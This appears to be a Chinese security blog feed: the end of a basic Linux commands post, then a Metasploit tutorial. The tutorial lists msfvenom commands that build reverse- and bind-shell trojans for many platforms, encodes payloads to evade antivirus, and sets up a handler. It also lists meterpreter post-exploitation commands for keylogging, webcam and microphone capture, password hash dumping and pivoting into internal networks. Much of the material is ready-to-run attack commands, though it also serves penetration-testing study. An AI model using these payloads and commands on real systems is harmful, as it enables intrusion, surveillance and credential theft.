<p>挂载U盘<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fdisk -l 查看U盘路径</div><div class="line">monut /dev/sdb4 /mnt  挂载U盘</div><div class="line"><span class="built_in">cd</span> /mnt 进入U盘</div><div class="line">umount /mnt  退出U盘</div></pre></td></tr></table></figure></p>
<h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>杀死python相关的进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep python | cut -d <span class="string">' '</span> -f 2 | xargs <span class="built_in">kill</span></div><div class="line">或者</div><div class="line">pkill -9 python  <span class="comment">#-9表示强制删除，pkill以进程名字匹配</span></div></pre></td></tr></table></figure></p>
<p>查看进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | less</div></pre></td></tr></table></figure></p>
<p>查看端口占用的进程状态：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof -i:3306</div></pre></td></tr></table></figure></p>
<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><p>查看网络连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -an | less</div></pre></td></tr></table></figure></p>
<p>查看网络路由<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route -n</div></pre></td></tr></table></figure></p>
<p>只查看ip信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep inet</div></pre></td></tr></table></figure></p>
<h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p>查看系统位数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>查看系统版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -a</div></pre></td></tr></table></figure></p>
<p>查看hosts文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/hosts</div></pre></td></tr></table></figure></p>
<p>查看CPU的核的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/cpuinfo | grep processor | wc -l</div></pre></td></tr></table></figure></p>
<p>查看系统信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">uname -m 显示机器的处理器架构</div><div class="line">uname -r 显示正在使用的内核版本</div><div class="line">cat /proc/cpuinfo 显示CPUinfo的信息</div><div class="line">cat /proc/meminfo 校验内存使用</div><div class="line">cat /proc/version 显示内核的版本</div><div class="line">cat /proc/net/dev 显示网络适配器及统计</div><div class="line">cat /proc/mounts 显示已加载的文件系统</div></pre></td></tr></table></figure></p>
<h3 id="性能管理"><a href="#性能管理" class="headerlink" title="性能管理"></a>性能管理</h3><h4 id="CPU-sar"><a href="#CPU-sar" class="headerlink" title="CPU(sar)"></a>CPU(sar)</h4><p>查看CPU使用率<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -u</div></pre></td></tr></table></figure></p>
<p>查看CPU平均负载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -q 1 2</div></pre></td></tr></table></figure></p>
<h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><p>查看内存使用情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sar -r 1 2</div><div class="line">或者</div><div class="line">free -m</div></pre></td></tr></table></figure></p>
<h4 id="网络流量监控-iftop"><a href="#网络流量监控-iftop" class="headerlink" title="网络流量监控(iftop)"></a>网络流量监控(iftop)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iftop -i eth1 -B <span class="comment">#-i 指定网卡，-B以byte显示，可以使用-h查看帮助信息</span></div></pre></td></tr></table></figure>
<h3 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h3><h4 id="管道和重定向-、-、-amp-amp-、-gt-、-gt-gt"><a href="#管道和重定向-、-、-amp-amp-、-gt-、-gt-gt" class="headerlink" title="管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)"></a>管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)</h4><ul>
<li>批处理命令连接执行，使用 |</li>
<li>串联使用分号 ;</li>
<li>前面成功，则执行后面一条，否则不执行:&amp;&amp;</li>
<li>前面失败，则后一条执行: ||</li>
<li><em>&gt;</em>覆盖原有内容</li>
<li><em>&gt;&gt;</em>文件后追加内容</li>
</ul>
<p>重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt; test.txt <span class="comment">#覆盖原有内容</span></div><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt;&gt; test.txt <span class="comment">#文件后追加内容</span></div></pre></td></tr></table></figure></p>
<p>清空文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:&gt; test.txt</div></pre></td></tr></table></figure></p>
<p>nohup输出重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup python revice_true_link.py &gt; ./<span class="built_in">log</span>/true_link.log &amp;</div></pre></td></tr></table></figure></p>
<h4 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h4><ul>
<li>Ctl-U   删除光标到行首的所有字符,在某些设置下,删除全行</li>
<li>Ctl-W   删除当前光标到前边的最近一个空格之间的字符</li>
<li>Ctl-H   backspace,删除光标前边的字符</li>
<li>Ctl-R   匹配最相近的一个文件，然后输出</li>
</ul>
<h4 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h4><p>访问远程资源，下载资源</p>
<ul>
<li>wget　　作用：下载远程文件  如：<a href="http://www.xxx.com/1.txt" target="_blank" rel="external">http://www.xxx.com/1.txt</a></li>
<li>curl　　作用：访问网页，返回包内容</li>
</ul>
<h4 id="程序运行"><a href="#程序运行" class="headerlink" title="程序运行"></a>程序运行</h4><ul>
<li>watch 运行的脚本 -n 秒数　　（几秒钟执行一次，不加n默认为2秒）</li>
<li>nohup 要运行的程序 &amp;　　(让程序在后台运行，忽略所有挂断信号)</li>
</ul>
<h3 id="Linux学习网站"><a href="#Linux学习网站" class="headerlink" title="Linux学习网站"></a>Linux学习网站</h3><ul>
<li><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></li>
<li><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></li>
</ul>
<h3 id="本文内容参考"><a href="#本文内容参考" class="headerlink" title="本文内容参考"></a>本文内容参考</h3><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
<p><em>注：本文内容部分来自互联网整理，部分来自个人经验总结；本文将持续收集更新，欢迎留言补充！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;即使跌倒了，你要懂得抓一把沙子在手里。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>【渗透神器系列】Metasploit</title>
    <link href="http://thief.one/2017/08/01/1/"/>
    <id>http://thief.one/2017/08/01/1/</id>
    <published>2017-08-01T10:03:08.000Z</published>
    <updated>2017-08-03T04:26:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Learn to walk before you run<br>先学走，再学跑</blockquote><br>　　今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。<br><a id="more"></a></p>
<h3 id="Mac下安装metasploit"><a href="#Mac下安装metasploit" class="headerlink" title="Mac下安装metasploit"></a>Mac下安装metasploit</h3><p>mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。<br>msfconsole路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/metasploit-framework/bin</div></pre></td></tr></table></figure></p>
<p>该目录下还有其他几个常用的工具：<br><img src="/upload_image/20170801/1.png" alt=""><br>msf的插件路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/metasploit-framework/embedded/framework/modules/exploits</div></pre></td></tr></table></figure></p>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>作用：生成木马文件，替代早期版本的msfpayload和msfencoder。</p>
<h4 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h4><p>msfvenom命令行选项如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</div><div class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</div><div class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</div><div class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --<span class="built_in">help</span>-formats 来获取msf支持的输出格式列表)</div><div class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</div><div class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</div><div class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</div><div class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</div><div class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="comment">#039;\x00\xff&amp;#039;</span></div><div class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</div><div class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</div><div class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</div><div class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">    --payload-options            列举payload的标准选项</div><div class="line">-o, --out   &lt;path&gt;               保存payload</div><div class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</div><div class="line">    --shellest                   最小化生成payload</div><div class="line">-h, --<span class="built_in">help</span>                       查看帮助选项</div><div class="line">    --<span class="built_in">help</span>-formats               查看msf支持的输出格式列表</div></pre></td></tr></table></figure></p>
<h4 id="options-usage"><a href="#options-usage" class="headerlink" title="options usage"></a>options usage</h4><p>查看支持的payload列表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l payloads</div></pre></td></tr></table></figure></p>
<p>查看支持的输出文件类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom --<span class="built_in">help</span>-formats</div></pre></td></tr></table></figure></p>
<p>查看支持的编码方式：(为了达到免杀的效果)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l encoders</div></pre></td></tr></table></figure></p>
<p>查看支持的空字段模块：(为了达到免杀的效果)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l nops</div></pre></td></tr></table></figure></p>
<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h4><p>命令格式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</div></pre></td></tr></table></figure></p>
<p>Linux<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">反向连接：</div><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div><div class="line">正向连接：</div><div class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure></p>
<p>Windows<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure></p>
<p>Mac<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div><div class="line">Web Payloads</div></pre></td></tr></table></figure></p>
<p>PHP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure></p>
<p>ASP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure></p>
<p>JSP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure></p>
<p>WAR<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</div><div class="line">Scripting Payloads</div></pre></td></tr></table></figure></p>
<p>Python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure></p>
<p>Bash<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure></p>
<p>Perl<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure></p>
<p>Linux Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div></pre></td></tr></table></figure></p>
<p>Windows Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div></pre></td></tr></table></figure></p>
<p>Mac Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div><div class="line">Handlers</div></pre></td></tr></table></figure></p>
<h4 id="payload加编码"><a href="#payload加编码" class="headerlink" title="payload加编码"></a>payload加编码</h4><p>命令格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt; --platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder <span class="built_in">times</span>&gt; -b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</div></pre></td></tr></table></figure></p>
<p>常用编码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">x86/shikata_ga_nai</div><div class="line">cmd/powershell_base64</div></pre></td></tr></table></figure></p>
<p>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -f exe &gt; 1.exe</div></pre></td></tr></table></figure></p>
<h4 id="自选模块"><a href="#自选模块" class="headerlink" title="自选模块"></a>自选模块</h4><p>生成执行计算器payload例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</div></pre></td></tr></table></figure></p>
<h4 id="payload的坑"><a href="#payload的坑" class="headerlink" title="payload的坑"></a>payload的坑</h4><p>正常情况下，利用msfvenom生成的木马文件，可直接上传到目标服务器上运行（加权限）。但我自己遇到过一个坑，生成的文件内容有部分是无用的，会引起报错，如下图所示。<br><img src="/upload_image/20170801/2.png" alt=""><br><img src="/upload_image/20170801/3.png" alt=""><br>解决方案是vim文件，删除文件开头两行无效的内容。</p>
<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>作用：用来在命令行下启动metasploit。<br><img src="/upload_image/20170801/4.png" alt=""><br>启动后可看到metasploit当前版本，以及各个模块的插件数量。</p>
<ul>
<li>auxiliary扫描模块</li>
<li>exploits漏洞利用模块</li>
<li>payloads</li>
<li>encoders编码模块</li>
<li>nops空字符模块</li>
</ul>
<h4 id="search寻找模块"><a href="#search寻找模块" class="headerlink" title="search寻找模块"></a>search寻找模块</h4><p>比如寻找ms15_034漏洞的利用插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">search ms15_034</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170801/5.png" alt=""></p>
<h4 id="配合木马弹Shell"><a href="#配合木马弹Shell" class="headerlink" title="配合木马弹Shell"></a>配合木马弹Shell</h4><p>前面我介绍了如何使用msfvenom生成木马文件，这里我介绍如何使用msf连接上被执行的木马文件，达到控制目标服务器。</p>
<h5 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h5><p>首先我们回顾一下生成木马文件的命令，其中有一个payload的选项，常用的几个payload。<br>linux相关payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">linux/x86/meterpreter/reverse_tcp</div><div class="line">linux/x86/meterpreter/bind_tcp</div><div class="line">linux/x86/shell_bind_tcp</div><div class="line">linux/x86/shell_reverse_tcp</div><div class="line">linux/x64/shell_reverse_tcp</div><div class="line">linux/x64/shell_bind_tcp</div></pre></td></tr></table></figure></p>
<p>windows相关payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">windows/meterpreter/reverse_tcp</div><div class="line">windows/meterpreter/bind_tcp</div><div class="line">windows/shell_reverse_tcp</div><div class="line">windows/shell_bind_tcp</div><div class="line">windows/x64/meterpreter/reverse_tcp</div><div class="line">windows/x64/meterpreter/bind_tcp</div><div class="line">windows/x64/shell_reverse_tcp</div><div class="line">windows/x64/shell_bind_tcp</div></pre></td></tr></table></figure></p>
<p>注意：含有x64只适用目标服务器为64位操作系统的，没有x64或者使用x86的只适用32位操作系统；含有meterpreter的模块会反弹meterpreter_shell，而普通的shell模块只会反弹普通的shell（反弹结果跟nc类似）；reverse_tcp表示木马会主动连接目标服务器，bind_tcp表示木马会监听本地的端口，等待攻击者连接。因此生成的木马文件，要根据具体情况而定。</p>
<h5 id="payload选择"><a href="#payload选择" class="headerlink" title="payload选择"></a>payload选择</h5><p>前面介绍了常用的payload，那么payload选择的三大要素如下：</p>
<ul>
<li>木马连接的方向</li>
<li>目标操作系统及版本</li>
<li>反弹的shell类型</li>
</ul>
<p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试，详细参考：<a href="https://thief.one/SecWeb/%2F2017%2F04%2F10%2F1%2F">【渗透神器系列】nc</a>）</p>
<p>目标操作系统类型查看：这个不说了！<br>操作系统位数查看：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>反弹shell类型：<br>这个主要取决于反弹的shell的用途，一般执行系统命令的话普通操作系统的shell就够了。如果想要使用高级功能，比如：键盘记录，开启摄像头，添加路由等功能，可以使用meterpreter_shell。</p>
<h5 id="连接木马"><a href="#连接木马" class="headerlink" title="连接木马"></a>连接木马</h5><p>开启msf，启用exploit/multi/handler模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp</div><div class="line">show options</div><div class="line"><span class="built_in">set</span> RHOST 10.0.0.1</div><div class="line"><span class="built_in">set</span> LPORT 12345  </div><div class="line">exploit</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170801/6.png" alt=""></p>
<p>注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。</p>
<h4 id="meterpreter-shell"><a href="#meterpreter-shell" class="headerlink" title="meterpreter shell"></a>meterpreter shell</h4><p>当我们拿到目标服务器的meterpreter_shell后，可以进行很多操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">backgroud 将msf进程放到后台</div><div class="line">session -i 1 将进程拖回前台运行</div><div class="line">run vnc 远程桌面的开启</div></pre></td></tr></table></figure></p>
<p>文件管理功能：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Download     下载文件</div><div class="line">Edit          编辑</div><div class="line">cat           查看</div><div class="line">mkdir         创建</div><div class="line">mv            移动</div><div class="line">rm            删除</div><div class="line">upload        上传         </div><div class="line">rmdir         删除文件夹</div></pre></td></tr></table></figure></p>
<p>网络及系统操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Arp          看ARP缓冲表</div><div class="line">Ifconfig     IP地址网卡</div><div class="line">Getproxy     获取代理</div><div class="line">Netstat      查看端口链接</div><div class="line">Kill         结束进程</div><div class="line">Ps           查看进程</div><div class="line">Reboot       重启电脑</div><div class="line">Reg          修改注册表</div><div class="line">Shell        获取shell</div><div class="line">Shutdown     关闭电脑</div><div class="line">sysinfo      获取电脑信息</div></pre></td></tr></table></figure></p>
<p>用户操作和其他功能讲解:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">enumdesktops     用户登录数</div><div class="line">keyscan_dump　　 键盘记录－下载</div><div class="line">keyscan_start　　键盘记录　－　开始</div><div class="line">keyscan_stop 　　键盘记录　－　停止</div><div class="line">Uictl　　　　　　获取键盘鼠标控制权</div><div class="line">record_mic　　　 音频录制</div><div class="line">webcam_chat　　　查看摄像头接口</div><div class="line">webcam_list　　　查看摄像头列表</div><div class="line">webcam_stream　　摄像头视频获取</div><div class="line">Getsystem　　　　获取高权限</div><div class="line">Hashdump　　　   下载ＨＡＳＨ</div></pre></td></tr></table></figure></p>
<h4 id="meterpreter添加路由"><a href="#meterpreter添加路由" class="headerlink" title="meterpreter添加路由"></a>meterpreter添加路由</h4><p>大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。</p>
<p>查看shell网络环境：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run get_local_subnets</div></pre></td></tr></table></figure></p>
<p>添加一条通向目标服务器内网的路由<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8 (根据目标内网网络而定)</div></pre></td></tr></table></figure></p>
<p>查看路由设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run autoroute –p</div></pre></td></tr></table></figure></p>
<p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route <span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<p>如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</div></pre></td></tr></table></figure></p>
